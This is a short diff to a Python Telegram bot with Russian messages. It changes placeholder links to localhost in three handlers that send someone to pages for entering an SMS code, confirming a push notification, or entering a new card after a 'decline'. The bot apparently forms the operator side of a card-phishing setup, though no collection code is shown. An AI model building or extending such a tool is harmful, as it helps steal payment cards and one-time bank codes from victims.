@@ -245,7 +245,7 @@ async def sms_code_handler(callback: types.CallbackQuery):
     # Отправляем пользователю ссылку на SMS страницу
     await callback.message.edit_text(
         f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n"
-        f"Перейдите по ссылке для ввода кода: http://your-domain.com/sms.html?action=sms",
+        f"Перейдите по ссылке для ввода кода: http://localhost:8000/sms.html?action=sms",
         parse_mode="HTML"
     )
     await callback.answer("SMS код запрошен")
@@ -257,7 +257,7 @@ async def push_handler(callback: types.CallbackQuery):
     # Отправляем пользователю ссылку на страницу с пуш-уведомлением
     await callback.message.edit_text(
         f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n"
-        f"Перейдите по ссылке для подтверждения: http://your-domain.com/loading.html?action=push",
+        f"Перейдите по ссылке для подтверждения: http://localhost:8000/loading.html?action=push",
         parse_mode="HTML"
     )
     await callback.answer("Пуш отправлен")
@@ -269,7 +269,7 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     # Отправляем пользователю ссылку на страницу оплаты с ошибкой
     await callback.message.edit_text(
         f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n"
-        f"Перейдите по ссылке для ввода новой карты: http://your-domain.com/payment.html?status=wrong_card",
+        f"Перейдите по ссылке для ввода новой карты: http://localhost:8000/payment.html?status=wrong_card",
         parse_mode="HTML"
     )
     await callback.answer("Карта отклонена")
@@ -677,4 +677,5 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
